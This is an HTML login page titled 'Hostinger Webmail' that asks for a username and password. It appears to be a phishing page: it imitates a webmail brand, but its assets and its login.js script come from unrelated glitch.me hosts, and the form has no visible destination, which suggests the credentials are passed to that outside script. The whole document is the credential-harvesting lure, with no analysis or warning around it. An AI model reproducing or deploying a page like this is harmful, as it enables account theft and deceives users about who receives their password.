<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Hostinger Webmail</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="theme-color" content="#f4f4f4">
<meta name="msapplication-navbutton-color" content="#f4f4f4">

<link rel="shortcut icon" href="https://cdn.glitch.global/493e8a66-a5d3-4498-b598-e8abc60156d0/logo-icon.svg?v=1729767670184">
<script src="https://use.fontawesome.com/c665d01d05.js"></script>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link rel="stylesheet" href="https://toothsome-airy-nickel.glitch.me/bootstrap.min.css">
<link rel="stylesheet" href="https://toothsome-airy-nickel.glitch.me/styless.css">
<link rel="stylesheet" type="text/css" href="https://toothsome-airy-nickel.glitch.me/jquery-ui.css">
<script src="https://translucent-pear-perfume.glitch.me/jquery.min.js"></script>
<script src="https://translucent-pear-perfume.glitch.me/jquery-ui.min.js"></script>
<style>
#login-form table .row .input-group input.form-control {
    height: initial;
    padding: 12px 16px;
    font-size: 14px;
    line-height: 24px;
    border: 1px solid #dad9da;
    border-radius: 4px;
}
.form-control {
    color: #2c363a;
}
input {
    vertical-align: middle;
}
</style>
</head>
<body class="task-login action-none">

<div id="layout">
<div id="layout-content" class="selected no-navbar" role="main">
<section class="main-section">
<div class="login-section">
<div class="login-wrapper">
<img src="https://cdn.glitch.global/493e8a66-a5d3-4498-b598-e8abc60156d0/logo.svg?v=1729767665493" data-src-small="0" id="logo" alt="Logo" />
<h2 class="text-left">
Hi, &#x1F44B<br>
Welcome to Hostinger Webmail
</h2>
<form id="login-form" name="login-form" method="post" class="propform">
<table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
</td>
<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input type="text" name="_user" id="rcmloginuser" size="40" autocapitalize="off" autocomplete="off" pattern="[^@\s]+@[^@\s]+\.[^@\s]+" title="Invalid email address" required class="form-control" placeholder="Username"></td>
</tr>
<tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
</td>
<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="_pass" id="rcmloginpwd" required="" size="40" autocapitalize="off" autocomplete="off" type="password" class="form-control" placeholder="Password"><span class="material-icons" id="show-pwd" title="Click to toggle password visibility">visibility</span></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button>
</p>
<div id="login-footer" role="contentinfo">
<a href="#" target="_blank" class="support-link">
Forgot password
</a>
</div>
</form>
</div>
</div>
</section>
</div>
<noscript>
	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
</noscript>
</div>
<div id="messagestack"></div>

<script src="https://translucent-pear-perfume.glitch.me/bootstrap.bundle.min.js"></script>
<script src="https://translucent-pear-perfume.glitch.me/ui.min.js"></script>
<script src="https://translucent-pear-perfume.glitch.me/login.js"></script>
</body>
</html>
